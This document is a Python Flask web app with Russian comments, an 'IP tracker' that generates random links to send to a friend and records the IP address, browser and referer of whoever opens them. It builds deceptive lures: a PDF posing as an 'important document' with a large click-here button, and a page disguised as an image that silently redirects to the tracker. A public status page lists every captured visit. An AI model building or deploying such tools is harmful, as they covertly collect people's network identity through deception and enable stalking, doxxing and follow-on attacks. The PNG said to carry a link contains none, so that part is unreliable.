#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Скрипт для отслеживания IP-адресов через случайные ссылки
Адаптирован для Render
"""

import random
import string
import os
import io
from flask import Flask, request, jsonify, send_file, Response
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch

app = Flask(__name__)

# Хранилище для отслеживания посещений
visits = {}

def generate_random_link(length=20):
    """Генерирует случайную строку для ссылки"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Генерируем случайную ссылку при запуске
tracking_code = generate_random_link()

@app.route('/')
def index():
    """Главная страница с информацией"""
    base_url = request.host_url.rstrip('/')
    tracking_url = f"{base_url}/track/{tracking_code}"
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>IP Tracker</title>
        <meta charset="utf-8">
        <style>
            body {{
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 20px;
            }}
            .container {{
                text-align: center;
                padding: 40px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 20px;
                backdrop-filter: blur(10px);
                max-width: 600px;
            }}
            h1 {{ font-size: 2.5em; margin-bottom: 20px; }}
            .link-box {{
                background: rgba(255, 255, 255, 0.2);
                padding: 20px;
                border-radius: 10px;
                margin: 20px 0;
                word-break: break-all;
            }}
            .link {{
                font-size: 1.2em;
                color: #fff;
                text-decoration: none;
            }}
            .code {{
                font-family: monospace;
                background: rgba(0, 0, 0, 0.3);
                padding: 10px;
                border-radius: 5px;
                margin: 10px 0;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 IP Tracker</h1>
            <p>Случайная ссылка для отслеживания:</p>
            <div class="link-box">
                <a href="{tracking_url}" class="link" target="_blank">{tracking_url}</a>
            </div>
            <div class="code">
                Код: {tracking_code}
            </div>
            <p>Отправьте эту ссылку другу для отслеживания IP-адреса</p>
            <div style="margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.15); border-radius: 10px;">
                <h3>📥 Скачать файлы для отправки:</h3>
                <div style="margin-top: 15px;">
                    <a href="/download/png/{tracking_code}" style="display: inline-block; margin: 10px; padding: 15px 25px; background: rgba(255, 255, 255, 0.3); border-radius: 8px; color: white; text-decoration: none; font-weight: bold;">📷 Скачать PNG</a>
                    <a href="/download/pdf/{tracking_code}" style="display: inline-block; margin: 10px; padding: 15px 25px; background: rgba(255, 255, 255, 0.3); border-radius: 8px; color: white; text-decoration: none; font-weight: bold;">📄 Скачать PDF</a>
                </div>
                <p style="font-size: 0.9em; margin-top: 15px; opacity: 0.9;">
                    📄 PDF: при открытии кликните на ссылку внутри документа<br>
                    📷 PNG: отправьте ссылку <a href="/image/{tracking_code}" style="color: #fff; text-decoration: underline;" target="_blank">/image/{tracking_code}</a> (автоматическое перенаправление)
                </p>
            </div>
            <p style="margin-top: 20px;"><a href="/status" style="color: #fff;">📊 Статус посещений</a></p>
        </div>
    </body>
    </html>
    '''

@app.route('/track/<code>')
def track(code):
    """Обработчик для отслеживания посещений"""
    # Получаем IP-адрес
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    
    # Получаем дополнительную информацию
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    referer = request.headers.get('Referer', 'Direct')
    
    # Сохраняем информацию о посещении
    visit_info = {
        'ip': ip,
        'timestamp': timestamp,
        'user_agent': user_agent,
        'code': code,
        'referer': referer
    }
    
    visits[code] = visit_info
    
    # Выводим информацию в консоль (логи Render)
    print("\n" + "="*60)
    print("🔍 ОБНАРУЖЕНО ПОСЕЩЕНИЕ!")
    print("="*60)
    print(f"📅 Время: {timestamp}")
    print(f"🌐 IP-адрес: {ip}")
    print(f"🔗 Код ссылки: {code}")
    print(f"💻 Браузер: {user_agent}")
    print(f"🔗 Referer: {referer}")
    print("="*60 + "\n")
    
    # Возвращаем простую страницу (можно замаскировать под что-то интересное)
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Загрузка...</title>
        <meta charset="utf-8">
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .container {
                text-align: center;
                padding: 40px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 20px;
                backdrop-filter: blur(10px);
            }
            h1 { font-size: 2.5em; margin-bottom: 20px; }
            .loader {
                border: 4px solid rgba(255, 255, 255, 0.3);
                border-top: 4px solid white;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Загрузка контента...</h1>
            <div class="loader"></div>
            <p>Пожалуйста, подождите</p>
        </div>
    </body>
    </html>
    '''

@app.route('/download/png/<code>')
def download_png(code):
    """Генерирует PNG изображение со встроенной ссылкой"""
    base_url = request.host_url.rstrip('/')
    track_url = f"{base_url}/track/{code}"
    
    # Создаем изображение
    img = Image.new('RGB', (800, 600), color='white')
    draw = ImageDraw.Draw(img)
    
    # Пытаемся использовать системный шрифт
    try:
        # Для Windows
        font_large = ImageFont.truetype("arial.ttf", 40)
        font_medium = ImageFont.truetype("arial.ttf", 24)
        font_small = ImageFont.truetype("arial.ttf", 18)
    except:
        try:
            # Альтернативный шрифт
            font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 40)
            font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 24)
            font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 18)
        except:
            # Используем стандартный шрифт
            font_large = ImageFont.load_default()
            font_medium = ImageFont.load_default()
            font_small = ImageFont.load_default()
    
    # Рисуем текст
    text = "Нажмите на изображение\nдля перехода"
    draw.text((400, 250), text, fill='black', font=font_large, anchor='mm')
    draw.text((400, 350), "Кликните по файлу", fill='gray', font=font_medium, anchor='mm')
    
    # Сохраняем в буфер
    img_buffer = io.BytesIO()
    img.save(img_buffer, format='PNG')
    img_buffer.seek(0)
    
    return send_file(img_buffer, mimetype='image/png', as_attachment=True, 
                    download_name=f'image_{code}.png')

@app.route('/image/<code>')
def image_redirect(code):
    """HTML страница, которая выглядит как изображение и автоматически перенаправляет"""
    base_url = request.host_url.rstrip('/')
    track_url = f"{base_url}/track/{code}"
    
    # Создаем HTML страницу, которая выглядит как изображение и перенаправляет
    html_content = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="refresh" content="0;url={track_url}">
        <title>Загрузка изображения...</title>
        <style>
            body {{
                margin: 0;
                padding: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-family: Arial, sans-serif;
                color: white;
            }}
            .container {{
                text-align: center;
            }}
            .loader {{
                border: 4px solid rgba(255, 255, 255, 0.3);
                border-top: 4px solid white;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }}
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="loader"></div>
            <p>Загрузка изображения...</p>
        </div>
        <script>window.location.href = "{track_url}";</script>
    </body>
    </html>
    '''
    
    return Response(html_content, mimetype='text/html')

@app.route('/download/pdf/<code>')
def download_pdf(code):
    """Генерирует PDF с кликабельной ссылкой"""
    base_url = request.host_url.rstrip('/')
    track_url = f"{base_url}/track/{code}"
    
    # Создаем PDF в памяти
    buffer = io.BytesIO()
    p = canvas.Canvas(buffer, pagesize=letter)
    width, height = letter
    
    # Добавляем заголовок
    p.setFont("Helvetica-Bold", 28)
    p.drawString(100, height - 80, "Важный документ")
    
    # Добавляем инструкции
    p.setFont("Helvetica", 16)
    p.drawString(100, height - 140, "Для просмотра содержимого нажмите на ссылку ниже:")
    
    # Создаем большую кликабельную область
    link_x = 100
    link_y = height - 220
    link_width = 400
    link_height = 50
    
    # Рисуем рамку для ссылки
    p.setStrokeColorRGB(0, 0, 1)
    p.setFillColorRGB(0.9, 0.9, 1)
    p.rect(link_x, link_y, link_width, link_height, fill=1, stroke=1)
    
    # Добавляем кликабельную ссылку
    p.linkURL(track_url, (link_x, link_y, link_x + link_width, link_y + link_height), 
              relative=0, addBorder=False)
    
    # Текст на кнопке
    p.setFont("Helvetica-Bold", 18)
    p.setFillColorRGB(0, 0, 0.8)
    p.drawString(link_x + 120, link_y + 15, "👉 НАЖМИТЕ ЗДЕСЬ 👈")
    
    # Дополнительная информация
    p.setFont("Helvetica", 12)
    p.setFillColorRGB(0, 0, 0)
    p.drawString(100, height - 300, "Этот документ содержит важную информацию.")
    p.drawString(100, height - 320, "Пожалуйста, откройте ссылку для продолжения.")
    
    # Добавляем метаданные
    p.setTitle(f"Document {code}")
    p.setAuthor("IP Tracker")
    p.setSubject("Tracking Document")
    
    p.save()
    buffer.seek(0)
    
    return send_file(buffer, mimetype='application/pdf', as_attachment=True,
                    download_name=f'document_{code}.pdf')

@app.route('/status')
def status():
    """Проверка статуса и получение всех посещений"""
    base_url = request.host_url.rstrip('/')
    tracking_url = f"{base_url}/track/{tracking_code}"
    
    return jsonify({
        'tracking_code': tracking_code,
        'tracking_url': tracking_url,
        'visits': visits,
        'total_visits': len(visits)
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("\n" + "="*60)
    print("🎯 ТРЕКЕР IP-АДРЕСОВ ЗАПУЩЕН!")
    print("="*60)
    print(f"🔗 Код отслеживания: {tracking_code}")
    print(f"🌐 Сервер запущен на порту: {port}")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=port, debug=False)

